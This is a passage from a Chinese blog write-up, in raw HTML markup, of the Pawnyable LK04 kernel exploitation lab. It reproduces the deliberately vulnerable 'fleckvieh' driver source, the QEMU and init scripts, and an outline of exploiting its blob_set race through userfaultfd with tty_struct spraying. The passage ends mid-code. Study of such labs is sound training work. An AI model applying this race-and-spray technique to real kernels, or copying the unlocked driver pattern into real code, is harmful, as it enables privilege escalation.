punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> fleckvieh.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/build<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="一、LK04-Userfaultfd"><a href="#一、LK04-Userfaultfd" class="headerlink" title="一、LK04 Userfaultfd"></a>一、LK04 Userfaultfd</h1><h2 id="一-逆向分析"><a href="#一-逆向分析" class="headerlink" title="(一)逆向分析"></a>(一)逆向分析</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token function">chmod</span> <span class="token number">666</span> /dev/fuse<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/vm/unprivileged_userfaultfdinsmod /root/fleckvieh.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/fleckvieh c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> fleckvieh /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Fleckvieh (LK04) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是<code>echo 1 &gt; /proc/sys/vm/unprivileged_userfaultfd</code>，我们可以进行userfaultfd系统调用</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fleckvieh-ko"><a href="#fleckvieh-ko" class="headerlink" title="fleckvieh.ko"></a>fleckvieh.ko</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">54</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./fleckvieh.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>likely和unlikely宏：<br><code>#define likely(x)      __builtin_expect(!!(x), 1)</code><br><code>#define unlikely(x)    __builtin_expect(!!(x), 0)</code><br>它们的作用是优化代码的执行，简而言之，likely代表if分支大概率会发生，unlikely代表if分支大概率不会发生</p></blockquote><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  tmp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">list_for_each_entry_safe</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>itr<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;  struct list_head list;&#125; blob_list;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭设备时，遍历链表删除所以节点，同时释放itr-&gt;data和itr</p><p>注意这里出现了一个名为blob_list的结构体</p><h4 id="module-ioctl"><a href="#module-ioctl" class="headerlink" title="module_ioctl"></a>module_ioctl</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_ADD<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_add</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_DEL<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_del</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_get</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_set</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;&#125; request_t;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们传入的参数要求是一个request_t结构体</p><h4 id="blob-add"><a href="#blob-add" class="headerlink" title="blob_add"></a>blob_add</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_add</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>new<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> <span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//检查req->size不超过0x1000</span>  new <span class="token operator">=</span> <span class="token punctuation">(</span>blob_list<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>blob_list<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//申请容纳blod_list结构体的堆块</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span><span class="token comment">//检查new非空</span>  new<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>req<span class="token operator">-></span>size<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//申请大小为size的堆块</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//将data拷贝给new->data</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  new<span class="token operator">-></span>size <span class="token operator">=</span> req<span class="token operator">-></span>size<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>    <span class="token function">get_random_bytes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>id<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//产生一个随机数id</span>  <span class="token function">list_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加入双链表</span>  <span class="token keyword">return</span> new<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;  struct list_head list;&#125; blob_list;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="blob-del"><a href="#blob-del" class="headerlink" title="blob_del"></a>blob_del</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_del</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>victim<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里涉及一个函数<code>blob_find_by_id()</code>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">blob_list <span class="token operator">*</span><span class="token function">blob_find_by_id</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">;</span>  <span class="token function">list_for_each_entry</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>id <span class="token operator">==</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> itr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遍历链表，通过id寻找目标节点</p><h4 id="blob-get"><a href="#blob-get" class="headerlink" title="blob_get"></a>blob_get</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_get</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//检查拷贝size不能大于目标节点的size</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token operator">-></span>data<span class="token punctuation">,</span> victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//拷贝数据</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="blob-set"><a href="#blob-set" class="headerlink" title="blob_set"></a>blob_set</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二-利用思路"><a href="#二-利用思路" class="headerlink" title="(二)利用思路"></a>(二)利用思路</h2><p><img src="/EXP_FILE/083e5331aa7965dabdcca9d9ab7efc6d_MD5.jpeg"></p><p>转化为堆溢出思路：</p><ol><li>先添加一个链表节点（blob_add）</li><li>线程1对其写操作（blob_set），在copy_from_usr前线程2修改req-&gt;size为非法值，并喷射tty_struct结构体，从而造成堆溢出</li><li>线程1执行copy_from_usr，修改tty_struct的函数指针</li></ol><p>转化为UAF的思路：</p><ol><li>先添加一个链表节点（blob_add）</li><li>线程1对其写操作（blob_set），在copy_from_usr前线程2进行删除操作（blob_del），并喷射tty_struct结构体</li><li>线程1执行copy_from_usr，修改tty_struct的函数指针</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token 